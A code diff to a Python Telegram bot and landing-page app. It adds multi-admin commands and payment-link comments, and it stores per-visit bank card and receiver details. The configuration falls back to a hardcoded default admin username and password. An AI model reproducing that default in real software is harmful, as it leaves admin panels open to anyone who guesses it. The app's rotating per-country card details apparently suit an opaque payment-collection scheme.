@@ -41,8 +41,18 @@ def parse_optional_int(raw_value: str, default: int | None = None) -> int | None
         return default
 
 
+def parse_admin_ids(*raw_values: str) -> set[int]:
+    result: set[int] = set()
+    for raw_value in raw_values:
+        for chunk in (raw_value or "").replace(";", ",").split(","):
+            admin_id = parse_optional_int(chunk)
+            if admin_id is not None and admin_id > 0:
+                result.add(admin_id)
+    return result
+
+
 BOT_TOKEN = os.getenv("BOT_TOKEN", "").strip()
-ADMIN_ID = parse_optional_int(os.getenv("ADMIN_ID", ""))
+INITIAL_ADMIN_IDS = parse_admin_ids(os.getenv("ADMIN_ID", ""), os.getenv("ADMIN_IDS", ""))
 WEB_URL = os.getenv("WEB_URL", "http://localhost:8000").rstrip("/")
 DEFAULT_CURRENCY = "EUR"
 DEFAULT_REFRESH_MINUTES = max(1, parse_optional_int(os.getenv("DEFAULT_REFRESH_MINUTES", ""), 15) or 15)
@@ -56,6 +66,7 @@ WAITING_REQUISITES = 2
 WAITING_MANAGER = 3
 WAITING_LINK_AMOUNT = 4
 WAITING_LINK_LABEL = 5
+WAITING_LINK_COMMENT = 6
 
 ADMIN_USERNAME = os.getenv("ADMIN_USERNAME", "telegram-dream-team")
 ADMIN_PASSWORD = os.getenv("ADMIN_PASSWORD", "12345qwert!@#$%QWERT")
@@ -231,6 +242,11 @@ def normalize_manager_link(raw_value: str | None) -> str:
     return value
 
 
+def clean_payment_comment(raw_value: str | None) -> str:
+    value = re.sub(r"\s+", " ", (raw_value or "").strip())
+    return value[:300]
+
+
 def parse_payment_amount(raw_value: str | None) -> float | None:
     if raw_value is None:
         return None
@@ -250,7 +266,7 @@ def format_query_amount(amount: float) -> str:
     return f"{amount:.2f}".rstrip("0").rstrip(".")
 
 
-def build_payment_link(amount: float, geo_code: str, label: str = "") -> str:
+def build_payment_link(amount: float, geo_code: str, label: str = "", comment: str = "") -> str:
     safe_geo = sanitize_geo_code(geo_code) or "ES"
     geo_profile = get_geo_profile(safe_geo)
     params = {
@@ -259,8 +275,11 @@ def build_payment_link(amount: float, geo_code: str, label: str = "") -> str:
         "lang": sanitize_language_code(geo_profile.get("default_language")) or "en",
     }
     clean_label = sanitize_payment_label(label)
+    clean_comment = clean_payment_comment(comment)
     if clean_label:
         params["label"] = clean_label
+    if clean_comment:
+        params["comment"] = clean_comment
     return f"{WEB_URL}/?{urlencode(params)}"
 
 
@@ -342,8 +361,31 @@ def seed_geo_data(conn: sqlite3.Connection) -> None:
             )
 
 
+def seed_bot_admins(conn: sqlite3.Connection) -> None:
+    now_value = utc_now_iso()
+    for admin_id in sorted(INITIAL_ADMIN_IDS):
+        conn.execute(
+            """
+            INSERT OR IGNORE INTO bot_admins (user_id, username, full_name, added_at, added_by)
+            VALUES (?, ?, ?, ?, ?)
+            """,
+            (admin_id, "", "", now_value, admin_id),
+        )
+
+
 def init_db() -> None:
     conn = get_connection()
+    conn.execute(
+        """
+        CREATE TABLE IF NOT EXISTS bot_admins (
+            user_id INTEGER PRIMARY KEY,
+            username TEXT,
+            full_name TEXT,
+            added_at TEXT,
+            added_by INTEGER
+        )
+        """
+    )
     conn.execute(
         """
         CREATE TABLE IF NOT EXISTS geo_profiles (
@@ -412,12 +454,14 @@ def init_db() -> None:
     ensure_column(conn, "visits", "snapshot_bank_name", "TEXT")
     ensure_column(conn, "visits", "snapshot_card_number", "TEXT")
     ensure_column(conn, "visits", "snapshot_receiver_name", "TEXT")
+    ensure_column(conn, "visits", "payment_comment", "TEXT")
     conn.execute(
         """
         CREATE INDEX IF NOT EXISTS idx_visits_visit_token
         ON visits (visit_token)
         """
     )
+    seed_bot_admins(conn)
     seed_geo_data(conn)
     conn.commit()
     conn.close()
@@ -644,6 +688,7 @@ def record_visit(
     geo_code: str,
     payment_amount: float | None,
     payment_label: str | None,
+    payment_comment: str | None,
     requisites: dict[str, Any] | None,
     request: Request,
 ) -> str:
@@ -656,9 +701,9 @@ def record_visit(
             user_agent, accept_language, recommended_language, geo_code, payment_amount,
             payment_label, referrer, page_path, query_string, created_at, visit_token,
             client_first_name, client_last_name, client_saved_at, requisites_id,
-            snapshot_bank_name, snapshot_card_number, snapshot_receiver_name
+            snapshot_bank_name, snapshot_card_number, snapshot_receiver_name, payment_comment
         )
-        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
+        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
         """,
         (
             mode,
@@ -687,6 +732,7 @@ def record_visit(
             requisites.get("bank_name") if requisites else None,
             requisites.get("card_number") if requisites else None,
             requisites.get("receiver_name") if requisites else None,
+            payment_comment or None,
         ),
     )
     conn.commit()
@@ -703,7 +749,8 @@ def list_visits(limit: int = 120) -> list[dict[str, Any]]:
             currency, user_agent, accept_language, recommended_language, geo_code,
             payment_amount, payment_label, referrer, page_path, query_string, created_at,
             visit_token, client_first_name, client_last_name, client_saved_at,
-            requisites_id, snapshot_bank_name, snapshot_card_number, snapshot_receiver_name
+            requisites_id, snapshot_bank_name, snapshot_card_number, snapshot_receiver_name,
+            payment_comment
         FROM visits
         ORDER BY id DESC
         LIMIT ?
@@ -712,6 +759,92 @@ def list_visits(limit: int = 120) -> list[dict[str, Any]]:
     ).fetchall()
     conn.close()
     return [dict(row) for row in rows]
+
+
+def list_bot_admins() -> list[dict[str, Any]]:
+    conn = get_connection()
+    rows = conn.execute(
+        """
+        SELECT user_id, username, full_name, added_at, added_by
+        FROM bot_admins
+        ORDER BY COALESCE(full_name, ''), user_id
+        """
+    ).fetchall()
+    conn.close()
+    return [dict(row) for row in rows]
+
+
+def is_bot_admin(user_id: int | None) -> bool:
+    if user_id is None:
+        return False
+    conn = get_connection()
+    row = conn.execute(
+        "SELECT 1 AS value FROM bot_admins WHERE user_id = ? LIMIT 1",
+        (user_id,),
+    ).fetchone()
+    conn.close()
+    return row is not None
+
+
+def upsert_bot_admin_identity(user: Any) -> None:
+    user_id = getattr(user, "id", None)
+    if user_id is None or not is_bot_admin(user_id):
+        return
+    username = getattr(user, "username", None) or ""
+    full_name = getattr(user, "full_name", None) or getattr(user, "name", None) or ""
+    conn = get_connection()
+    conn.execute(
+        """
+        UPDATE bot_admins
+        SET username = ?, full_name = ?
+        WHERE user_id = ?
+        """,
+        (username, full_name, user_id),
+    )
+    conn.commit()
+    conn.close()
+
+
+def add_bot_admin(actor_id: int, target_user_id: int) -> bool:
+    now_value = utc_now_iso()
+    conn = get_connection()
+    existing = conn.execute(
+        "SELECT user_id FROM bot_admins WHERE user_id = ? LIMIT 1",
+        (target_user_id,),
+    ).fetchone()
+    if existing is not None:
+        conn.close()
+        return False
+    conn.execute(
+        """
+        INSERT INTO bot_admins (user_id, username, full_name, added_at, added_by)
+        VALUES (?, ?, ?, ?, ?)
+        """,
+        (target_user_id, "", "", now_value, actor_id),
+    )
+    conn.commit()
+    conn.close()
+    return True
+
+
+def remove_bot_admin(target_user_id: int) -> tuple[bool, str]:
+    conn = get_connection()
+    count_row = conn.execute("SELECT COUNT(*) AS value FROM bot_admins").fetchone()
+    admins_total = int(count_row["value"]) if count_row else 0
+    existing = conn.execute(
+        "SELECT user_id FROM bot_admins WHERE user_id = ? LIMIT 1",
+        (target_user_id,),
+    ).fetchone()
+    if existing is None:
+        conn.close()
+        return False, "Админ с таким ID не найден."
+    if admins_total <= 1:
+        conn.close()
+        return False, "Нельзя удалить последнего администратора."
+    conn.execute("DELETE FROM bot_admins WHERE user_id = ?", (target_user_id,))
+    conn.commit()
+    conn.close()
+    return True, "Администратор удален."
 
 
 def save_landing_client(visit_token: str, first_name: str, last_name: str) -> dict[str, Any]:
@@ -943,6 +1076,7 @@ bot_app = Application.builder().token(BOT_TOKEN).build() if BOT_ENABLED else Non
 def get_bot_status() -> dict[str, Any]:
     runtime_running = False
     updater_running = False
+    admins_total = len(list_bot_admins())
 
     if bot_app is not None:
         runtime_running = bool(getattr(bot_app, "running", False))
@@ -951,11 +1085,12 @@ def get_bot_status() -> dict[str, Any]:
 
     return {
         "enabled": BOT_ENABLED,
-        "admin_id_configured": ADMIN_ID is not None,
+        "admin_id_configured": admins_total > 0,
+        "admin_count": admins_total,
         "runtime_started": BOT_RUNTIME_STARTED,
         "app_running": runtime_running,
         "updater_running": updater_running,
-        "control_panel_ready": BOT_ENABLED and ADMIN_ID is not None and BOT_RUNTIME_STARTED,
+        "control_panel_ready": BOT_ENABLED and admins_total > 0 and BOT_RUNTIME_STARTED,
         "web_url": WEB_URL,
         "error": BOT_RUNTIME_ERROR,
     }
@@ -971,6 +1106,7 @@ def main_keyboard() -> ReplyKeyboardMarkup:
         [
             ["🗺 Выбрать GEO", "📊 GEO статус"],
             ["📝 Реквизиты", "👤 Менеджер"],
+            ["👥 Админы"],
             ["🔗 Ссылка на оплату"],
         ],
         resize_keyboard=True,
@@ -1011,16 +1147,32 @@ def build_geo_overview_text() -> str:
     return "\n".join(blocks)
 
 
+def build_admins_text() -> str:
+    admins = list_bot_admins()
+    lines = ["Администраторы бота:"]
+    for item in admins:
+        display_name = item["full_name"] or item["username"] or "Без имени"
+        username = f"@{item['username']}" if item["username"] else "username не задан"
+        lines.append(f"\nID: {item['user_id']} | {display_name} | {username}")
+    lines.append(
+        "\nДобавить: /addadmin 123456789\n"
+        "Удалить: /removeadmin 123456789\n"
+        "Список: /admins"
+    )
+    return "\n".join(lines)
+
+
 async def admin_check(update: Update) -> bool:
     message = update.effective_message
     if message is None:
         return False
-    if ADMIN_ID is None:
-        await message.reply_text("ADMIN_ID еще не настроен в окружении.")
+    if not list_bot_admins():
+        await message.reply_text("Администраторы бота еще не настроены. Добавьте ADMIN_ID или ADMIN_IDS в окружение.")
         return False
-    if update.effective_user is None or update.effective_user.id != ADMIN_ID:
+    if update.effective_user is None or not is_bot_admin(update.effective_user.id):
         await message.reply_text("Нет доступа. Вы не администратор.")
         return False
+    upsert_bot_admin_identity(update.effective_user)
     return True
 
 
@@ -1040,6 +1192,55 @@ async def show_geo_status_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE
     if not await admin_check(update):
         return
     await update.effective_message.reply_text(build_geo_overview_text(), reply_markup=main_keyboard())
+
+
+async def show_admins_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    if not await admin_check(update):
+        return
+    await update.effective_message.reply_text(build_admins_text(), reply_markup=main_keyboard())
+
+
+async def add_admin_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    if not await admin_check(update):
+        return
+    if not context.args:
+        await update.effective_message.reply_text(
+            "Укажите Telegram ID нового администратора.\nПример: /addadmin 123456789",
+            reply_markup=main_keyboard(),
+        )
+        return
+    target_id = parse_optional_int(context.args[0])
+    if target_id is None or target_id <= 0:
+        await update.effective_message.reply_text("Нужен корректный числовой Telegram ID.", reply_markup=main_keyboard())
+        return
+    added = add_bot_admin(update.effective_user.id, target_id)
+    if not added:
+        await update.effective_message.reply_text("Этот администратор уже добавлен.", reply_markup=main_keyboard())
+        return
+    await update.effective_message.reply_text(
+        f"Администратор {target_id} добавлен.\n\n{build_admins_text()}",
+        reply_markup=main_keyboard(),
+    )
+
+
+async def remove_admin_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    if not await admin_check(update):
+        return
+    if not context.args:
+        await update.effective_message.reply_text(
+            "Укажите Telegram ID администратора для удаления.\nПример: /removeadmin 123456789",
+            reply_markup=main_keyboard(),
+        )
+        return
+    target_id = parse_optional_int(context.args[0])
+    if target_id is None or target_id <= 0:
+        await update.effective_message.reply_text("Нужен корректный числовой Telegram ID.", reply_markup=main_keyboard())
+        return
+    success, message = remove_bot_admin(target_id)
+    await update.effective_message.reply_text(
+        f"{message}\n\n{build_admins_text()}",
+        reply_markup=main_keyboard(),
+    )
 
 
 async def select_geo_start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
@@ -1157,8 +1358,6 @@ async def create_link_amount(update: Update, context: ContextTypes.DEFAULT_TYPE)
 
 
 async def create_link_label(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    amount = float(context.user_data.get("temp_amount", 0))
-    selected_geo = get_selected_geo(context)
     label = update.effective_message.text.strip()
     if label != "-" and not payment_label_has_only_latin(label):
         await update.effective_message.reply_text(
@@ -1167,14 +1366,28 @@ async def create_link_label(update: Update, context: ContextTypes.DEFAULT_TYPE) 
         )
         return WAITING_LINK_LABEL
 
-    clean_label = "" if label == "-" else sanitize_payment_label(label)
-    link = build_payment_link(amount, selected_geo, clean_label)
+    context.user_data["temp_label"] = "" if label == "-" else sanitize_payment_label(label)
+    await update.effective_message.reply_text(
+        "Введите комментарий для лендинга или отправьте - если он не нужен."
+    )
+    return WAITING_LINK_COMMENT
+
+
+async def create_link_comment(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
+    amount = float(context.user_data.get("temp_amount", 0))
+    selected_geo = get_selected_geo(context)
+    clean_label = str(context.user_data.get("temp_label", ""))
+    comment = update.effective_message.text.strip()
+    clean_comment = "" if comment == "-" else clean_payment_comment(comment)
+    link = build_payment_link(amount, selected_geo, clean_label, clean_comment)
     context.user_data.pop("temp_amount", None)
+    context.user_data.pop("temp_label", None)
     await update.effective_message.reply_text(
         f"Ссылка готова.\n\n"
         f"GEO: {selected_geo}\n"
         f"Сумма: {amount:.2f} {DEFAULT_CURRENCY}\n"
         f"Назначение: {clean_label or 'не указано'}\n"
+        f"Комментарий: {clean_comment or 'не указан'}\n"
         f"Ссылка: {link}",
         reply_markup=main_keyboard(),
     )
@@ -1207,12 +1420,17 @@ if bot_app is not None:
         states={
             WAITING_LINK_AMOUNT: [MessageHandler(filters.TEXT & ~filters.COMMAND, create_link_amount)],
             WAITING_LINK_LABEL: [MessageHandler(filters.TEXT & ~filters.COMMAND, create_link_label)],
+            WAITING_LINK_COMMENT: [MessageHandler(filters.TEXT & ~filters.COMMAND, create_link_comment)],
         },
         fallbacks=[CommandHandler("cancel", cancel_cmd)],
     )
 
     bot_app.add_handler(CommandHandler("start", start_cmd))
+    bot_app.add_handler(CommandHandler("admins", show_admins_cmd))
+    bot_app.add_handler(CommandHandler("addadmin", add_admin_cmd))
+    bot_app.add_handler(CommandHandler("removeadmin", remove_admin_cmd))
     bot_app.add_handler(MessageHandler(filters.Regex("^📊 GEO статус$"), show_geo_status_cmd))
+    bot_app.add_handler(MessageHandler(filters.Regex("^👥 Админы$"), show_admins_cmd))
     bot_app.add_handler(conv_handler_geo)
     bot_app.add_handler(conv_handler_req)
     bot_app.add_handler(conv_handler_manager)
@@ -1289,6 +1507,7 @@ async def landing_context(
     payment: str | None = None,
     geo: str | None = None,
     label: str | None = None,
+    comment: str | None = None,
 ):
     visitor, browser_language = await build_visitor_context(request)
     resolved_geo = resolve_geo_code(geo, visitor.get("country_code"), browser_language)
@@ -1299,6 +1518,7 @@ async def landing_context(
     requisites = get_active_requisites(resolved_geo) if mode != "invalid" else None
     refresh_seconds = max(60, int(profile["refresh_minutes"]) * 60) if mode != "invalid" else 0
     recommended_language = sanitize_language_code(profile["default_language"]) or "en"
+    payment_comment = clean_payment_comment(comment)
 
     visit_token = record_visit(
         mode=mode,
@@ -1307,6 +1527,7 @@ async def landing_context(
         geo_code=resolved_geo,
         payment_amount=payment_amount,
         payment_label=payment_label or None,
+        payment_comment=payment_comment or None,
         requisites=requisites,
         request=request,
     )
@@ -1319,6 +1540,7 @@ async def landing_context(
             "amount": payment_amount if payment_amount is not None else (DEFAULT_PREVIEW_AMOUNT if mode == "preview" else None),
             "currency": DEFAULT_CURRENCY,
             "label": payment_label,
+            "comment": payment_comment,
         },
         "geo": {
             **profile,
